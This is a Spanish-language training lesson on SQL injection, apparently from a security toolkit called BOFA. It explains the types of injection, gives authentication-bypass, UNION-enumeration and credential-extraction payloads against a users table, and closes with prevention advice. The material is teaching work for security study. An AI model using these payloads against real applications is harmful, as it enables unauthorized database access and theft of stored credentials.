
# SQL Injection - Fundamentos y Práctica

## 🎯 Objetivo de la Lección
Aprender a identificar, explotar y prevenir vulnerabilidades de inyección SQL en aplicaciones web.

## 📚 Conceptos Clave

### ¿Qué es SQL Injection?
La inyección SQL es una vulnerabilidad que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos.

### Tipos de SQL Injection
1. **In-band SQLi** - Error-based y Union-based
2. **Blind SQLi** - Boolean-based y Time-based
3. **Out-of-band SQLi** - DNS y HTTP requests

## 🛠️ Práctica con BOFA

### Paso 1: Reconocimiento
```sql
' OR 1=1-- 
" OR 1=1-- 
admin'--
' UNION SELECT NULL,NULL--
```

### Paso 2: Enumeración
```sql
' UNION SELECT version(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### Paso 3: Explotación
```sql
' UNION SELECT username,password FROM users--
```

## 🧪 Laboratorio
1. Ejecuta el script `learn_sql_injection.py`
2. Analiza las diferentes payloads
3. Identifica qué técnicas son más efectivas
4. Practica la explotación manual

## ✅ Validación
- ¿Pudiste extraer información de la base de datos?
- ¿Entiendes la diferencia entre Union-based y Blind SQLi?
- ¿Sabes cómo prevenir estas vulnerabilidades?

## 🛡️ Prevención
- Usar prepared statements
- Validar y sanitizar inputs
- Implementar WAF
- Principio de menor privilegio en DB
